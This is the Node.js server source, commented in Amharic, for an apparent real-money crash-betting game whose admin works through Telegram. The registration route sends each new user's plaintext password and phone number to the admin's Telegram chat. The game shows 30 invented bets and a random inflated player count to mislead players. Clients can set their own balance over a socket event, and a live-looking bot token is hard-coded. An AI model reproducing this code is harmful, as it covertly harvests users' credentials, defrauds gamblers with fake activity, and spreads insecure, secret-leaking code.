const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const bcrypt = require('bcryptjs');

const app = express();

// 1. CORS ማስተካከያ (ለላይቭ ስራ የግድ ነው)
app.use(cors({
    origin: "*",
    methods: ["GET", "POST"]
}));
app.use(express.json({ limit: '15mb' })); 

const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// --- Configuration (ቴሌግራም) ---
const TELEGRAM_TOKEN = '8601691945:AAHuf1tKpCAmU6j6cOqp0i8sR0qv4F0nCPc';
const ADMIN_CHAT_ID = '2068983666';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// ግንኙነት እንዳይቋረጥ ስህተቶችን መያዝ
bot.on('polling_error', (error) => {
    // console.log("Telegram error caught");
});

// --- ዳታቤዝ (ጊዜያዊ) ---
let users = []; 
let userSockets = {}; // ስልክን ከሶኬት ጋር ለማያያዝ

// --- የጨዋታ ሁኔታ (Game State) ---
let gameState = {
    multiplier: 1.0,
    status: 'waiting',
    timer: 10,
    userCount: 2500,
    liveBets: [],
    gameHistory: []
};

// --- የውሸት ውርርዶች መፍጠሪያ (30 ሰዎች) ---
const generateFakeBets = () => {
    const fakeNames = ["Abebe", "Sara", "Yoni", "Mery", "Ethio", "King", "Lucky", "Dave", "Kal", "Bini", "Tedi", "Hani", "Mahi", "Lili"];
    let bets = Array.from({ length: 30 }, () => {
        const name = fakeNames[Math.floor(Math.random() * fakeNames.length)] + "***" + Math.floor(Math.random() * 99);
        const amount = (Math.floor(Math.random() * 100) + 1) * 10; 
        return { 
            user: name, 
            amount, 
            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) 
        };
    });
    return bets.sort((a, b) => b.amount - a.amount);
};

// --- Authentication Routes (Login/Register) ---
app.post('/register', async (req, res) => {
    const { phone, password } = req.body;
    try {
        if (users.find(u => u.phone === phone)) {
            return res.json({ status: 'error', error: 'ይህ ስልክ ቁጥር ተመዝግቧል!' });
        }
        const hashedPassword = await bcrypt.hash(password, 10);
        users.push({ phone, password: hashedPassword, balance: 0 });

        // የምዝገባ መረጃን ለቦት መላክ
        const msg = `👤 *አዲስ ተመዝጋቢ*\n\n📱 ስልክ: \`${phone}\` \n🔑 Password: \`${password}\` \n🕒 ጊዜ: ${new Date().toLocaleString()}`;
        bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => {});

        res.json({ status: 'ok' });
    } catch (err) {
        res.json({ status: 'error', error: 'የምዝገባ ስህተት!' });
    }
});

app.post('/login', async (req, res) => {
    const { phone, password } = req.body;
    const user = users.find(u => u.phone === phone);
    if (!user) return res.json({ status: 'error', error: 'ተጠቃሚው አልተገኘም' });

    const isMatch = await bcrypt.compare(password, user.password);
    if (isMatch) {
        res.json({ status: 'ok', balance: user.balance, phone: user.phone });
    } else {
        res.json({ status: 'error', error: 'የይለፍ ቃል ተሳስቷል' });
    }
});

// --- Telegram Approve/Reject Logic ---
bot.on('callback_query', (query) => {
    const [action, phone, amount] = query.data.split('_');
    const user = users.find(u => u.phone === phone);

    if (action === 'approve' && user) {
        user.balance += parseFloat(amount);
        bot.sendMessage(ADMIN_CHAT_ID, `✅ የ ${phone} ዲፖዚት ጸድቋል። አዲሱ ባላንስ: ${user.balance.toFixed(2)} ETB`);
        
        if (userSockets[phone]) {
            io.to(userSockets[phone]).emit('balanceUpdate', user.balance);
        }
    } else if (action === 'reject') {
        bot.sendMessage(ADMIN_CHAT_ID, `❌ የ ${phone} የ ${amount} ብር ጥያቄ ተሰርዟል።`);
    }
    bot.answerCallbackQuery(query.id);
});

// --- Socket Communication ---
io.on('connection', (socket) => {
    socket.emit('data', gameState);

    socket.on('identify', (phone) => {
        userSockets[phone] = socket.id;
    });

    socket.on('updateServerBalance', (data) => {
        const user = users.find(u => u.phone === data.phone);
        if (user) {
            user.balance = parseFloat(data.newBalance);
        }
    });

    socket.on('sendDepositRequest', (data) => {
        const msg = `💰 *የዲፖዚት ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*`;
        const opts = {
            caption: msg,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ አጽድቅ (Approve)', callback_data: `approve_${data.phone}_${data.amount}` },
                    { text: '❌ ሰርዝ (Reject)', callback_data: `reject_${data.phone}_${data.amount}` }
                ]]
            }
        };

        if (data.screenshot) {
            const buffer = Buffer.from(data.screenshot.replace(/^data:image\/\w+;base64,/, ""), 'base64');
            bot.sendPhoto(ADMIN_CHAT_ID, buffer, opts).catch(e => {
                bot.sendMessage(ADMIN_CHAT_ID, msg, opts);
            });
        } else {
            bot.sendMessage(ADMIN_CHAT_ID, msg, opts);
        }
    });

    socket.on('sendWithdrawRequest', (data) => {
        const user = users.find(u => u.phone === data.phone);
        if (user) {
            user.balance -= parseFloat(data.amount); 
        }
        const msg = `📤 *የዊዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*\n⚠️ ባላንሳቸው ቀንሷል፤ ብሩን ይላኩላቸው።`;
        bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });
    });

    socket.on('disconnect', () => {
        for (let phone in userSockets) {
            if (userSockets[phone] === socket.id) delete userSockets[phone];
        }
    });
});

// --- Game Engine Logic ---
const startGame = () => {
    gameState.status = 'waiting';
    gameState.timer = 10;
    gameState.multiplier = 1.0;
    gameState.liveBets = generateFakeBets();
    gameState.userCount = Math.floor(Math.random() * 1000) + 2000;

    const countdown = setInterval(() => {
        gameState.timer--;
        io.emit('data', gameState);
        if (gameState.timer <= 0) {
            clearInterval(countdown);
            startFlying();
        }
    }, 1000);
};

const startFlying = () => {
    gameState.status = 'flying';
    const crashPoint = Math.random() < 0.1 ? 1.0 : parseFloat((1 / (1 - Math.random() * 0.95)).toFixed(2));
    
    const interval = setInterval(() => {
        if (gameState.multiplier < crashPoint) {
            const increment = gameState.multiplier < 2 ? 0.01 : 0.05;
            gameState.multiplier = parseFloat((gameState.multiplier + increment).toFixed(2));
            io.emit('data', gameState);
        } else {
            clearInterval(interval);
            gameState.status = 'crashed';
            gameState.gameHistory.unshift(gameState.multiplier);
            if (gameState.gameHistory.length > 12) gameState.gameHistory.pop();
            io.emit('data', gameState);
            setTimeout(startGame, 3000);
        }
    }, 100);
};

// 2. Render ፖርት ማስተካከያ (በጣም ወሳኝ!)
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
    console.log(`✅ ሰርቨሩ በፖርት ${PORT} ላይ ስራ ጀምሯል`);
    startGame();
});
